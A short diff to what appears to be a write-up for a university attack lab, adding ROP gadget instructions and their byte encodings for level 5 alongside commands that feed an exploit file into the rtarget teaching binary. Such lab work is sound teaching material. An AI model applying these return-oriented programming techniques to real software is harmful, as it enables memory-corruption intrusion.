@@ -81,6 +81,10 @@ cat exploit4.txt | ./hex2raw | ./rtarget -q
 
 ## level5
 
+movq %rsp, %rax;   48 89 e0 
+movq %rax, %rdi;   48 89 c7
+
+
 ```shell
 ./hex2raw < exploit5.txt > raw5.txt
 b *0x4017bd
